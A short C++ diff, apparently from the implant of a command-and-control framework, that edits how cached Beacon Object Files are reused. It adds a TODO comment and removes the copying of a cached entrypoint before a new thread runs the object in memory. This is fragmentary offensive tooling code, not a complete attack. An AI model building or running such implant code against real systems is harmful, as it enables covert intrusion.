@@ -237,13 +237,13 @@ namespace Memory {
             coff->task_id       = Ctx->session.current_taskid;
 
             // TODO: test that coff data size being zero is a correct way to do this
+            // TODO: with previously loaded BOFs (peer_id, task_id, msg_type, msg_length, [entrypoint, null, args, etc..])
+
             if (!coff->data_size) {
                 saved = GetCoff(coff->coff_id);
 
                 coff->data              = saved->data;
                 coff->data_size         = saved->data_size;
-                coff->entrypoint        = saved->entrypoint;
-                coff->entrypoint_length = saved->entrypoint_length;
             }
 
             if (!CreateUserThread(NtCurrentProcess(), X64, (void*) CoffThread, coff, nullptr)) {
